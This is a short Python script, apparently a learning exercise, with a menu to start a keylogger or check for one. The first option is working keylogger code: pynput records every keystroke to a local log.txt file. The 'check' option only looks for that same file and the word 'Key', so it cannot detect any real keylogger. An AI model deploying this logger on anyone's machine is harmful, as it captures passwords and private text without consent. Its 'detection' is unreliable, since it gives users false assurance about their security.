from pynput.keyboard import Listener
import os
def log_key(key):
    with open("log.txt","a") as f:
        f.write(str(key)+"\n")
def check_log():
    if os.path.exists("log.txt"):
        with open("log.txt") as f:
            if "Key" in f.read():
                print("Keylogger activity detected !!")
            else:
                print("No Keylogger")
    else:
        print("No log file found")
choice=input("1. Start keylogger\n2. Check for keylogger\nEnter choice(1/2): ")
if choice=="1":
    with Listener(on_press=log_key) as l:
        l.join()
elif choice=="2":
    check_log()
else:
    print("Invalid choice")